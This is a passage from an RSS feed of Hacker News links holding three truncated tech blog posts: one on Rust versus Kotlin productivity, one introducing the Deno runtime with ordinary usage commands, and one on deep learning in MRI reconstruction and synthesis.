I‚Äôve started IntelliJ Rust without Kotlin experience and never felt that I need to specifically learn Kotlin.</p>
<p>When I switched to rust-analyzer, I was pretty experienced with Rust.
I would say that one definitely needs to deliberately learn Rust, it‚Äôs hard to pick it up on the go.
Ownership and aliasing control are novel concepts (even if you come from C++), and taking holistic approach to learning them pays off.
After the initial learning step the ride is generally smooth.</p>
<p>By the way, this is the perfect place to plug our Rust courses and tailor-made <a href="https://ferrous-systems.com/training/">trainings</a> :-)
The next <a href="https://ferrous-systems.com/training/#package-intro-training">introduction to Rust</a> is happening this December!</p>
</div>
</div>
<div>
<h2 id="_modularity">Modularity</h2>
<div>
<p>This I think is the biggest factor.
Both projects are moderately large in terms of scope as well as in terms of amount of source code.
I believe that the only way to ship big things is to split them in independent-ish chunks and implement the chunks separately.</p>
<p>I also find most of the languages I am familiar with to be pretty horrible with respect to modularity.
More generally, I am amused with FP vs OO debate, as it seems that ‚Äúwhy no one does modules right?‚Äù is a more salient issue.</p>
<p>Rust is one of the few languages which has first-class concept of libraries.
Rust code is organized on two levels:</p>
<div>
<ul>
<li>
<p>as a tree of inter-dependent modules inside a crate</p>
</li>
<li>
<p>and as a directed acyclic graph of crates</p>
</li>
</ul>
</div>
<p>Cyclic dependencies are allowed between the modules, but not between the crates.
Crates are units of reuse and privacy: only crate‚Äôs public API matters, and it is crystal clear what crate‚Äôs public API is.
Moreover, crates are anonymous, so you don‚Äôt get name conflicts and dependency hell when mixing several versions of the same crate in a single crate graph.</p>
<p>This makes it very easy to make two pieces of code <strong>not</strong> depend on each other (non-dependencies are the essence of modularity): just put them in separate crates.
During code review, only changes to Cargo.tomls need to be monitored carefully.</p>
<p>At the time of comparison, rust-analyzer is split into 23 internal crates, with a handful general-purposed ones released on crates.io.
In contrast, IntelliJ Rust is a single Kotlin module, where everything can depend on everything else.
Although internal organization of IntelliJ Rust is pretty clean, it‚Äôs not reflected in the file system layout and build system, and needs constant maintenance.</p>
</div>
</div>
<div>
<h2 id="_build_system">Build System</h2>
<div>
<p>Managing project‚Äôs build takes significant amount of times, and has multiplicative effect on everything else.</p>
<p>Rust‚Äôs build system, <a href="https://doc.rust-lang.org/cargo/index.html">Cargo</a>, is very good.
It‚Äôs not perfect, but it is a breath of fresh air after Java‚Äôs <a href="https://gradle.org/">Gradle</a>.</p>
<p>Cargo‚Äôs trick is that it doesn‚Äôt try to be a general purpose build system.
It can only build Rust projects, and it has rigid expectation about the project structure.
It‚Äôs impossible to opt out of the core assumptions.
Configuration is a static non-extensible TOML file.</p>
<p>In contrast, Gradle allows free-form project structure, and is configured via a Turing complete language.
I feel like I‚Äôve spend more time learning Gradle than learning Rust!
Running <code>wc -w</code> gives 182_817 words for Rust book, and 280_506 for Gradle‚Äôs user guide.</p>
<p>Additionally, Cargo is just faster than Gradle in most cases.</p>
<p>Of course, the biggest downside is that custom build logic is not expressible in Cargo.
Both projects needs substantial amount of logic beyond mere compilation to deliver the final result to the user.
For rust-analyzer, this is handled by hand-written Rust script, which works perfectly at this scale.</p>
</div>
</div>
<div>
<h2 id="_ecosystem">Ecosystem</h2>
<div>
<p>Language-level support for libraries and top-notch build system/package manager allow for a thriving ecosystem.
rust-analyzer relies on third-party libraries much more than IntelliJ Rust.
Some parts of rust-analyzer are also published to crates.io for other projects to reuse.</p>
<p>Additionally, low-level nature of the Rust programming language often allows for ‚Äúperfect‚Äù library interfaces.
Interfaces which exactly reflect the underlying problem, without imposing intermediate language-level abstractions.</p>
</div>
</div>
<div>
<h2 id="_basic_conveniences">Basic Conveniences</h2>
<div>
<p>I feel that Rust is significantly more productive when it comes to basic language nuts and bolts‚Äâ‚Äî‚Äâstructs, enums, functions, etc.
This is not specific to Rust‚Äâ‚Äî‚Äâany ML-family language has them.
However, Rust is the first industrial language which wraps these features in a nice package, not constrained by backwards compatibility.
I want to list specific features which I think allow producing maintainable code faster in Rust</p>
<p><em>Emphasis on data over behavior</em>.
Aka, Rust is not an OOP language.
The core idea of OOP is that of dynamic dispatch‚Äâ‚Äî‚Äâwhich code is invoked by a function call is decided at runtime (late binding).
This is a powerful pattern which allows for flexible and extensible system.
The problem is, extensibility is costly!
It‚Äôs better only to apply it in certain designated areas.
Designing for extensibility by default is not cost effective.
Rust puts static dispatch front and center: it is mostly clear whats going on by just reading the code, as it is independent of runtime types of the objects.</p>
<p>One small syntactic thing I enjoy about Rust is how it puts fields and methods into different blocks syntactically:</p>
<div>
<div>
<pre><code data-lang="rust"><span>struct</span> <span>Person</span> <span>{</span>
  <span>first_name</span><span>:</span> <span>String</span><span>,</span>
  <span>last_name</span><span>:</span> <span>String</span><span>,</span>
<span>}</span>

<span>impl</span> <span>Person</span> <span>{</span>
    <span>fn</span> <span>full_name</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
        <span>...</span>
    <span>}</span>
<span>}</span></code></pre>
</div>
</div>
<p>Being able to see at a glance all the fields makes understanding the code much simpler.
Fields convey much more information than methods.</p>
<p><em>Sum types</em>.
Rust‚Äôs humbly named enums are full algebraic data types.
This means that you can express the idea of disjoint union:</p>
<div>
<div>
<pre><code data-lang="rust"><span>enum</span> <span>Either</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>{</span> <span>A</span><span>(</span><span>A</span><span>),</span> <span>B</span><span>(</span><span>B</span><span>)</span> <span>}</span></code></pre>
</div>
</div>
<p>This is hugely useful in day-to-day programming in the small, and some times during programming in the large as well.
To give one example, one of the core concepts for an IDE are references and definitions.
A definition a like <code>let foo = 92;</code> assigns a name to an entity which can be used down a line.
A reference like <code>foo + 90</code> <em>refers</em> to some definition.
When you ctrl-click on reference, you go to the definition.</p>
<p>Natural way to model that in Kotlin is by adding <code>interface Definition</code> and <code>interface Reference</code>.
The problem is, some things are ‚Ä¶</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/">https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/</a></em></p>]]>
            </description>
            <link>https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24935355</guid>
            <pubDate>Thu, 29 Oct 2020 20:28:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Does Deno mean goodbye to Node.js?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24935265">thread link</a>) | @jerodsanto
<br/>
October 29, 2020 | https://www.stackbuilders.com/news/welcome-deno-does-this-mean-goodbye-to-node-js | <a href="https://web.archive.org/web/*/https://www.stackbuilders.com/news/welcome-deno-does-this-mean-goodbye-to-node-js">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>During the last 10 years, Node.js has become a big player in the backend framework market, powering several large scale applications across the globe. Meanwhile, JavaScript has also evolved greatly, not only because of the efforts of its development team, but also based on community feedback. However, integrating some of these new language features into a 10-year-old framework is not really straightforward, and has a high level of complexity.</p>
<p>Therefore we could say that Node.js‚Äô architecture hasn‚Äôt evolved as fast as the language. As a basic example, Node.js is still based on callbacks, while there are far better ways to deal with asynchronicity in modern JavaScript. This is something that its creator, Ryan Dahl, has acknowledged in the past few years, and it has moved him to work on a new framework that addresses some of these issues. It is called Deno, and in the following article, we would like to explore some of its concepts to determine if it will render Node.js obsolete.</p>
<h2 id="what-is-deno">What is Deno?</h2>
<p>First of all, you should know that Deno is not a fork of Node.js. It‚Äôs a modern runtime for JavaScript and TypeScript, implemented from scratch by Ryan Dahl in 2018. It was built on <a href="https://v8.dev/">V8</a> just like Node.js, but Deno was written with <a href="https://www.rust-lang.org/">Rust</a> and <a href="https://tokio.rs/">Tokio</a>. The runtime was designed with TypeScript in mind, and for that reason Deno supports TypeScript without extra configurations or tooling.</p>
<p>Deno was built to improve security and help increase productivity in developers using the latest JavaScript features. At the time this article was written, Deno‚Äôs version is 1.4.0. It‚Äôs a stable release, so it‚Äôs a good time to go over its main features and learn how you can use them for your application.</p>
<h2 id="features">Features</h2>
<h3 id="typescript-out-of-the-box">TypeScript out of the box:</h3>
<p>TypeScript is powerful. This superset of JavaScript allows us to use types, interfaces, classes, inheritance, modules, generics, and other awesome things. However, it can be a bit tricky when using it with Node.js, because we need to install a module for TypeScript support and some tools to transpile the code. It also requires some additional configurations through tsconfig.json. However, after all of this setup, the JavaScript files that get compiled from TypeScript work pretty well with Node.js.</p>
<p>Deno offers native support for TypeScript at its 3.9 version. For it to run nothing else needs to be installed, and no compilation step is needed since Deno transpiles the code behind the scenes. It is also possible to run the code with a custom <code>tsconfig.json</code> file to customize how Deno compiles your code.</p>
<div id="cb1"><pre><code><span id="cb1-1"><a href="#cb1-1"></a><span># Using a custom tsconfig.json file</span></span>
<span id="cb1-2"><a href="#cb1-2"></a><span>deno</span> run -c tsconfig.json my-application.ts</span></code></pre></div>
<h3 id="url-imports">URL imports:</h3>
<p>Node.js projects have a <code>package.json</code> file that contains relevant information for your project. It also holds the dependency list that you‚Äôll be using. Deno handles this part in a completely different way. The <code>package.json</code> file is not used anymore in favor of <code>ES Modules</code>. In order to use modules in a Deno project, you will need to reference each module with its URL or file path.</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a># Import <span>module</span> <span>server</span></span>
<span id="cb2-2"><a href="#cb2-2"></a><span>import</span> <span>{</span>serve<span>}</span> <span>from</span> ‚Äúhttps<span>:</span><span>//deno.land/std/http/server.ts‚Äù</span></span></code></pre></div>
<p>When the application is executed for the first time, Deno downloads and caches all modules in a global cache. It is possible to store them in a custom directory using the <code>$DENO_DIR</code> environment variable. With this approach, Deno decentralizes the modules and your project will not have a large <code>node_modules</code> folder.</p>
<p>To keep module versions locked, it is possible to create a lock file with the <code>--lock</code> and <code>--lock-write</code> flags.</p>
<div id="cb3"><pre><code><span id="cb3-1"><a href="#cb3-1"></a><span># Create/update the lock file "lock.json"</span></span>
<span id="cb3-2"><a href="#cb3-2"></a><span>deno</span> cache --lock=lock.json --lock-write src/my-application.ts</span></code></pre></div>
<h3 id="secure-by-default">Secure by Default:</h3>
<p>Deno has some security measures in place to disallow potentially dangerous operations. By default, the code is executed in a secure sandbox, so it is not possible to access the network, file system, or environment unless you explicitly allow it. You can do this by adding flags when running the application. These are enabled by default in Node.js, which makes it insecure in some cases.</p>
<p>As a quick overview of what can be enabled we have the following flags:</p>
<div id="cb4"><pre><code><span id="cb4-1"><a href="#cb4-1"></a><span># Enable environment access with Deno.env.get</span></span>
<span id="cb4-2"><a href="#cb4-2"></a><span>deno</span> run --allow-env my-application.ts</span>
<span id="cb4-3"><a href="#cb4-3"></a></span>
<span id="cb4-4"><a href="#cb4-4"></a><span>#Enable high resolution time measurement (used for profiling)</span></span>
<span id="cb4-5"><a href="#cb4-5"></a><span>deno</span> run --allow-hrtime my-application.ts</span>
<span id="cb4-6"><a href="#cb4-6"></a></span>
<span id="cb4-7"><a href="#cb4-7"></a><span>#Enable network access</span></span>
<span id="cb4-8"><a href="#cb4-8"></a><span># This is used in cases where we want to fetch from external servers</span></span>
<span id="cb4-9"><a href="#cb4-9"></a><span># or when we want to expose a port from our server</span></span>
<span id="cb4-10"><a href="#cb4-10"></a><span>deno</span> run --allow-net=https://example.com my-application.ts</span>
<span id="cb4-11"><a href="#cb4-11"></a></span>
<span id="cb4-12"><a href="#cb4-12"></a><span># Enable plugin usage</span></span>
<span id="cb4-13"><a href="#cb4-13"></a><span>deno</span> run --allow-plugin my-application.ts</span>
<span id="cb4-14"><a href="#cb4-14"></a></span>
<span id="cb4-15"><a href="#cb4-15"></a><span># Enable filesystem access</span></span>
<span id="cb4-16"><a href="#cb4-16"></a><span># To read a file or directory with Deno.open, or write to a file</span></span>
<span id="cb4-17"><a href="#cb4-17"></a><span># or  directory with Deno.writeFile</span></span>
<span id="cb4-18"><a href="#cb4-18"></a><span>deno</span> run --allow-read=awesome.txt my-application.ts</span>
<span id="cb4-19"><a href="#cb4-19"></a><span>deno</span> run --allow-write=awesome.txt my-application.ts</span>
<span id="cb4-20"><a href="#cb4-20"></a></span>
<span id="cb4-21"><a href="#cb4-21"></a><span># Enable subprocess execution with Deno.run</span></span>
<span id="cb4-22"><a href="#cb4-22"></a><span>deno</span> run --allow-run my-application.ts</span>
<span id="cb4-23"><a href="#cb4-23"></a></span>
<span id="cb4-24"><a href="#cb4-24"></a><span># Disable all security checks</span></span>
<span id="cb4-25"><a href="#cb4-25"></a><span>deno</span> run --allow-all my-application.ts</span></code></pre></div>
<h3 id="built-in-utilities">Built-in utilities:</h3>
<p>In Deno, we have some nice tools available out of the box. This means that we don‚Äôt need to install any additional libraries for some common development tasks. At a glance, these utilities are:</p>
<p><strong>Debugger:</strong> Like Node, Deno supports the V8 Inspector Protocol, which means that it‚Äôs possible to debug the program in any client that supports it. This consists mainly of two commands:</p>
<div id="cb5"><pre><code><span id="cb5-1"><a href="#cb5-1"></a><span># Debugging flags</span></span>
<span id="cb5-2"><a href="#cb5-2"></a><span>#   --inspect      : Allows debugger attachment at any point</span></span>
<span id="cb5-3"><a href="#cb5-3"></a><span>#   --inspect-brk  : Pause execution on first line</span></span>
<span id="cb5-4"><a href="#cb5-4"></a><span># Usage:</span></span>
<span id="cb5-5"><a href="#cb5-5"></a><span>deno</span> run --inspect-brk</span></code></pre></div>
<p>From this point, all you have to do is open your client and the program will stop on the first line, allowing you to set up breakpoints where you need to. For VSCode you can add the entry point and arguments to your <code>launch.json</code> to enable it.</p>
<p><strong>Formatter:</strong> In Node.js applications, it‚Äôs common to add a linter tool (typically ESLint) with a formatter like Prettier so the code is standardized. Deno has this feature built into it. You can access it by simply running <code>deno fmt</code></p>
<div id="cb6"><pre><code><span id="cb6-1"><a href="#cb6-1"></a><span>deno</span> fmt          <span>#Formats everything in the current tree</span></span>
<span id="cb6-2"><a href="#cb6-2"></a><span>deno</span> fmt file1.ts <span>#Formats a single file</span></span>
<span id="cb6-3"><a href="#cb6-3"></a><span>deno</span> fmt --check  <span># Checks if files are formatted correctly</span></span></code></pre></div>
<p><strong>Bundler:</strong> Bundling is a task that is currently done with webpack, gulp or Grunt in Node.js applications. We can use Deno‚Äôs bundler when we want to pack a module together with its dependencies and this will generate a single module we can reference from other files. These bundles can also be loaded in the web browser.</p>
<div id="cb7"><pre><code><span id="cb7-1"><a href="#cb7-1"></a><span>deno</span> bundle https://foo.bar/test.ts test.bundle.js</span></code></pre></div>
<p>After that, we can import it from another JavaScript file or using a <code>&lt;script&gt;</code> tag in our HTML with the <code>type=‚Äùmodule‚Äù</code> property.</p>
<p><strong>Dependency inspector:</strong> We can display a tree structure of our dependencies using the <code>deno info</code> command, followed by the URL we want to inspect. This is similar to <code>npm ls</code> in Node</p>
<div id="cb8"><pre><code><span id="cb8-1"><a href="#cb8-1"></a><span>deno</span> info https://deno.land/std/uuid/test.ts</span>
<span id="cb8-2"><a href="#cb8-2"></a><span>local</span>: /Users/foo/Library/Caches/deno/deps/https/deno.land/997789467b3621b5d93c6b18bf8b275f35057b24f934c2508e3d1ef52cd51644</span>
<span id="cb8-3"><a href="#cb8-3"></a><span>type</span>: TypeScript</span>
<span id="cb8-4"><a href="#cb8-4"></a><span>compiled</span>: /Users/foo/Library/Caches/deno/gen/https/deno.land/std/uuid/test.ts.js</span>
<span id="cb8-5"><a href="#cb8-5"></a><span>map</span>: /Users/foo/Library/Caches/deno/gen/https/deno.land/std/uuid/test.ts.js.map</span>
<span id="cb8-6"><a href="#cb8-6"></a><span>deps</span>:</span>
<span id="cb8-7"><a href="#cb8-7"></a><span>https</span>://deno.land/std/uuid/test.ts</span>
<span id="cb8-8"><a href="#cb8-8"></a>  ‚îú‚îÄ‚î¨ <span>https</span>://deno.land/std/uuid/tests/isNil.ts</span>
<span id="cb8-9"><a href="#cb8-9"></a>  ‚îÇ ‚îú‚îÄ‚î¨ <span>https</span>://deno.land/std/testing/asserts.ts</span>
<span id="cb8-10"><a href="#cb8-10"></a>  ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ <span>https</span>://deno.land/std/fmt/colors.ts</span>
<span id="cb8-11"><a href="#cb8-11"></a>  ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ <span>https</span>://deno.land/std/testing/diff.ts</span>
<span id="cb8-12"><a href="#cb8-12"></a>  ‚îÇ ‚îî‚îÄ‚î¨ <span>https</span>://deno.land/std/uuid/mod.ts</span>
<span id="cb8-13"><a href="#cb8-13"></a>  ‚îÇ   ‚îú‚îÄ‚î¨ <span>https</span>://deno.land/std/uuid/v1.ts</span>
<span id="cb8-14"><a href="#cb8-14"></a>  <span>.</span></span>
<span id="cb8-15"><a href="#cb8-15"></a>  <span>.</span></span>
<span id="cb8-16"><a href="#cb8-16"></a>  <span>.</span></span></code></pre></div>
<h3 id="asynchronous-handling">Asynchronous handling:</h3>
<p>JavaScript asynchronous operations have evolved over time. The standard way of making an asynchronous call was through the use of callbacks. Recently we‚Äôve gotten better ways to handle these operations, by using Promises, async/await syntax or generators. For that reason, Deno has taken advantage of these modern features.</p>
<p>All async actions in Deno return a promise. This is interesting because the <code>await</code> keyword is supported on the top level and there is no need to define the function with the <code>async</code> keyword. This approach allows us to write more readable code when working with asynchronism.</p>
<div id="cb9"><pre><code><span id="cb9-1"><a href="#cb9-1"></a><span>// Await some asynchronous operation</span></span>
<span id="cb9-2"><a href="#cb9-2"></a><span>let</span> file <span>=</span> <span>await</span> <span>Deno</span><span>.</span><span>open</span>(<span>'./my-file.txt'</span>)<span>;</span></span>
<span id="cb9-3"><a href="#cb9-3"></a></span>
<span id="cb9-4"><a href="#cb9-4"></a><span>// Awaiting when starting the server</span></span>
<span id="cb9-5"><a href="#cb9-5"></a><span>import</span> <span>{</span> serve <span>}</span> <span>from</span> <span>'https://deno.land/std/http/server.ts'</span><span>;</span></span>
<span id="cb9-6"><a href="#cb9-6"></a></span>
<span id="cb9-7"><a href="#cb9-7"></a><span>const</span> server <span>=</span> <span>serve</span>(<span>{</span> port<span>:</span> <span>3000</span> <span>}</span>)<span>;</span></span>
<span id="cb9-8"><a href="#cb9-8"></a></span>
<span id="cb9-9"><a href="#cb9-9"></a><span>for</span> <span>await</span> (<span>const</span> req <span>of</span> server)<span>{</span></span>
<span id="cb9-10"><a href="#cb9-10"></a>  <span>req</span><span>.</span><span>respond</span>(<span>{</span> body<span>:</span> <span>'Running server!!'</span> <span>}</span>)<span>;</span></span>
<span id="cb9-11"><a href="#cb9-11"></a><span>}</span></span></code></pre></div>
<p>Deno supports promises out of the box. In the first example, the <code>await</code> keyword waits until <code>Deno.open</code> is resolved and its result is stored in the <code>file</code> variable. In the second example, <code>server</code> is an async iterator and the <code>for await</code> keywords are used to iterate them, each item will be a new incoming request.</p>

<p>Deno has incredible features, but there are two points that I think can be improved: - The permission flags could be handled in a different way like using a file that allows us to set the flags. If your code needs almost all the permissions you will have to use a long command. However, this is not a big issue on itself. - About the dependencies, NodeJS has a better project organization and the <code>lock</code> file is generated automatically. With Deno your dependencies will be placed in one directory, and to lock the dependencies you need to run an additional command. This might not be a good developer experience, but the community is working on some alternatives to change this.</p>
<p>Another point I would like to mention is regarding the examples and tutorials. On the NodeJS side, you can find a lot of examples/tutorials of any library or functionality you may need, while with Deno there are few examples/tutorials. But it will increase in the future for sure.</p>
<p>In this <a href="https://github.com/stackbuilders/deno-example">link</a> you will find a small example using Deno and Typescript that shows how to create routes with the <code>oak</code> module, submit data from a form and generate a CSV file with the provided data.</p>
<h2 id="conclusion">Conclusion:</h2>
<p>Deno is a good alternative for increasing security that allows us to use TypeScript without extra configurations or ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.stackbuilders.com/news/welcome-deno-does-this-mean-goodbye-to-node-js">https://www.stackbuilders.com/news/welcome-deno-does-this-mean-goodbye-to-node-js</a></em></p>]]>
            </description>
            <link>https://www.stackbuilders.com/news/welcome-deno-does-this-mean-goodbye-to-node-js</link>
            <guid isPermaLink="false">hacker-news-small-sites-24935265</guid>
            <pubDate>Thu, 29 Oct 2020 20:21:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deep learning in MRI: Medical image reconstruction, registration, and synthesis]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24935255">thread link</a>) | @black0017
<br/>
October 29, 2020 | https://theaisummer.com/mri-beyond-segmentation/ | <a href="https://web.archive.org/web/*/https://theaisummer.com/mri-beyond-segmentation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                            
                            

<p>If you believe that medical imaging and deep learning is just about segmentation, this article is here to prove you wrong. We will cover a few basic applications of deep neural networks in <strong>Magnetic Resonance Imaging</strong> (<strong>MRI</strong>).</p>

<p>The motivation is simple yet important: First, many image diagnosis tasks require the initial search to identify abnormalities, quantify measurement and change over time. Secondly, deep learning methods are increasingly used to improve clinical practice. In the field of MRI, deep learning has seen applications at every step of <strong>entire workflows</strong>. To provide some additional context, we can divide the aspects of deep learning in MRI into two parts, as in [1]:</p>

<ul>
  <li>
    <p><strong>the signal processing chain</strong>, which is close to the physics of MRI, including <strong>image reconstruction, restoration,</strong> and <strong>image registration</strong>, and</p>
  </li>
  <li>
    <p>the use of deep learning in MR reconstructed images, such as medical image <strong><a href="https://theaisummer.com/medical-image-deep-learning/" target="_blank">segmentation</a></strong>, <strong>super-resolution, medical image synthesis</strong>.</p>
  </li>
</ul>

<p><img src="https://theaisummer.com/assets/img/posts/mri-beyond-segmentation/deep-learning-mri-application-overview.png" alt="deep-learning-mri-application-overview">
<em>Aspects of Deep Learning applications in the signal processing chain of MRI, taken from Selvikv√•g Lundervold et al. [1]</em></p>

<p>Our aim is to provide the reader with an overview of how deep learning can improve MR imaging. Before we begin, and since we are focusing on MRI, let‚Äôs clarify some concepts. This video is a great place to start, or revise, the MRI fundamentals.</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/nFkBhUYynUw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<blockquote>
  <p>For a hands-on course on <strong>AI for Medicine, check out this great <a href="https://click.linksynergy.com/deeplink?id=r24KwW5qbBo&amp;mid=40328&amp;murl=https%3A%2F%2Fwww.coursera.org%2Fspecializations%2Fai-for-medicine" rel="noopener" target="_blank">course</a></strong>.</p>
</blockquote>

<h3 id="contents">Contents</h3>
<ul id="markdown-toc">
  <li><a href="#medical-image-reconstruction-in-mri" id="markdown-toc-medical-image-reconstruction-in-mri">Medical Image Reconstruction in MRI</a></li>
  <li><a href="#medical-image-denoising-and-synthesis" id="markdown-toc-medical-image-denoising-and-synthesis">Medical Image Denoising and Synthesis</a></li>
  <li><a href="#super-resolution-in-medical-images" id="markdown-toc-super-resolution-in-medical-images">Super-resolution in medical images</a></li>
  <li><a href="#medical-image-registration" id="markdown-toc-medical-image-registration">Medical Image Registration</a></li>
</ul>

<h2 id="medical-image-reconstruction-in-mri">Medical Image Reconstruction in MRI</h2>

<h3 id="what-is-medical-image-reconstruction-prerequisites-and-background-of-mri">What is Medical Image Reconstruction: Prerequisites and Background of MRI?</h3>

<p>The MR image generation can be quickly summed up in the following steps:</p>

<ol>
  <li>
    <p>The MRI machine emits a radio frequency (RF) pulse at a specific frequency.</p>
  </li>
  <li>
    <p>Radiofrequency coils send the pulse to the area of the body to be examined.</p>
  </li>
  <li>
    <p>Then, the RF pulse is absorbed by protons, causing their redirection with respect to the primary magnetic field to change.</p>
  </li>
  <li>
    <p>When the RF pulse is turned off, the protons ‚Äúrelax‚Äù back to the initial alignment by emitting radio-waves in the process.</p>
  </li>
  <li>
    <p>Finally, the spatial information is encoded as measured data during the acquisition in the frequency domain.</p>
  </li>
</ol>

<p><img src="https://theaisummer.com/assets/img/posts/mri-beyond-segmentation/mri-image-acquitision-overview.png" alt="mri-image-acquitision-overview">
<em>Overview of MRI measured data. <a href="https://www.ccppetmr.ac.uk/sites/www.ccppetmr.ac.uk/files/Prieto.pdf" rel="noopener" target="_blank">Source:King‚Äôs College London</a></em></p>

<p>In the MRI world, they usually refer to the initial encoded acquired data as <strong>k-space</strong>. They are basically <a href="https://en.wikipedia.org/wiki/Fourier_transform" rel="noopener" target="_blank">Fourier-transformed data</a>. To go back to spatial information, we simply apply the inverse Fourier transform to obtain the MR image. This process is exactly the definition of <strong>MRI reconstruction</strong>. If you look at the 3D volume from the <strong>axial view</strong> (imagine being above the patient and looking down) it looks like this:</p>



<blockquote>
  <p>It‚Äôs difficult to imagine it but the k-space shown above contains equivalent information with an MR 2D slice!</p>
</blockquote>

<h3 id="medical-image-reconstruction-with-deep-learning">Medical Image Reconstruction with deep learning</h3>

<p>One of the first works that employed deep learning in the reconstruction process was by Schlemper et al. 2017 [2]. The authors proposed a framework for reconstructing dynamic sequences of 2D cardiac magnetic resonance (MR) images from under-sampled acquisition data, using a deep cascade of convolutional neural networks (CNNs). <strong>Their aim was to accelerate the data MRI acquisition process</strong>. It is worth noting that each 2D image frame was reconstructed independently (not optimal approach).</p>

<p>Interestingly, the proposed deep learning architecture method outperformed 2D compression-based approaches in terms of reconstruction error and reconstruction speed. Finally, the authors showed that their method outperforms state-of-the-art methods and can <strong>preserve the anatomical structure</strong>.</p>

<p><img src="https://theaisummer.com/assets/img/posts/mri-beyond-segmentation/ground-truth-reconstructed-image.png" alt="ground-truth-reconstructed-image">
<em>Ground truth reconstruction</em></p>

<p><img src="https://theaisummer.com/assets/img/posts/mri-beyond-segmentation/Predicted-reconstruction-and-relative-error.png" alt="Predicted-reconstruction-and-relative-error">
<em>Predicted reconstruction and relative error VS ground truth</em></p>

<h3 id="the-fastmri-project-accelerating-mr-imaging-with-ai">The fastMRI project: Accelerating MR Imaging with AI</h3>

<p>Recently, <a href="https://ai.facebook.com/" rel="noopener" target="_blank">Facebook AI Research (FAIR)</a> and <a href="https://nyulangone.org/" rel="noopener" target="_blank">NYU Langone Health</a> created a project called fastMRI. The goal is to exploit AI to speed up MRI scans, up to 10 times faster. And to achieve awesome stuff with deep learning in any domain, first you need data!</p>

<p>To this end, they introduced the <strong>fastMRI dataset</strong> to enable Machine Learning-based breakthroughs in the reconstruction of accelerated MR images. The raw MRI data they provide, include 8344 volumes, consisting of 167,375 slices. Moreover, they released processed MR images in <a href="https://theaisummer.com/medical-image-coordinates/" target="_blank">DICOM</a> format from 20,000 knee and brain examinations. That is more than 1.57 million slices for heavy deep learning. The dataset can be found <a href="https://fastmri.med.nyu.edu/" rel="noopener" target="_blank">here</a>.</p>

<p>The main data are listed below:</p>

<ul>
  <li>
    <p>Raw multi-coil <strong>k-space</strong> data: unprocessed complex-valued multi-coil MR measurements.</p>
  </li>
  <li>
    <p>Ground-truth images: <strong>real-valued reconstructed images</strong> from fully-sampled multi-coil acquisitions. These may be used as references to evaluate the quality of reconstructions.</p>
  </li>
  <li>
    <p><a href="https://theaisummer.com/medical-image-coordinates/" target="_blank">DICOM images</a>: spatially-resolved images for which the raw data were discarded during the acquisition process. These images are provided to represent a larger variety of machines and settings that are present in the raw data.</p>
  </li>
</ul>

<p>However, to give you a brief idea let‚Äôs shortly discuss the proposed architecture of their recent publication [Sriram et al. 2020]:</p>

<p><img src="https://theaisummer.com/assets/img/posts/mri-beyond-segmentation/architecture-fast-mri-fair.png" alt="architecture-fast-mri-fair">
<em>A block diagram of the reconstruction model.</em></p>

<p>The reconstruction model takes an under-sampled k-space as input and applies several cascade models (Unet-based models), followed by an inverse <a href="https://www.imaios.com/en/e-Courses/e-MRI/The-Physics-behind-it-all/2D-Fourier-transform" rel="noopener" target="_blank">Fourier transform</a> and a <a href="https://www.quora.com/What-is-the-root-sum-squared" rel="noopener" target="_blank">root-sum-squares transform</a>.</p>

<p>Based on the original authors: ‚ÄúThe Data Consistency (<strong>DC</strong>) module computes a correction map that brings the intermediate k-space closer to the measured k-space values. The Refinement (<strong>R</strong>) module maps multi-coil k-space data into one image, applies a U-Net, and then back to multi-coil k-space data. The Sensitivity Map Estimation (SME) module estimates the sensitivity maps used in the Refinement module.‚Äù ~ Sriram et al. 2020 [5]</p>

<p><img src="https://theaisummer.com/assets/img/posts/mri-beyond-segmentation/Reconstruction-knee-results-fair.png" alt="Reconstruction-knee-results-fair">
<em>Reconstruction results with 4x and 8x the reference speed</em></p>

<p>It is impossible to analyze all the endeavors of such a huge project in a single article. Please refer to the <a href="https://github.com/facebookresearch/fastMRI/blob/master/LIST_OF_PAPERS.md" rel="noopener" target="_blank">list of publications</a> for more info on their findings.</p>

<h2 id="medical-image-denoising-and-synthesis">Medical Image Denoising and Synthesis</h2>

<p>If you followed our <a href="https://theaisummer.com/gan-computer-vision/" target="_blank">GAN article-series</a>, I am 100% sure that you know what image generation is. <strong>Image synthesis/generation is simply the learning of the distribution of the data in order to be able to produce new, realistic, crispy representative images</strong>. We can learn to produce images unconditionally, or constrain the images to satisfy a particular condition. It can be applied to medical images to solve tasks such as image denoising, image translation etc.</p>

<p>We will briefly describe the work proposed by Bermudez et al. 2018 [3], which was done in order to extract quantitative information from the acquired images. Their aim was to improve common image processing techniques with deep learning and provide a <strong>general framework to distinguish structural changes in the brain</strong>.</p>

<p>The authors used deep learning techniques to investigate implicit manifolds (latent space) of normal brains and generate new, high-quality images. This is nothing more than unconditional image generation. We start by sampling noise from a fixed distribution and try to learn a mapping to the real-world MRI data!</p>

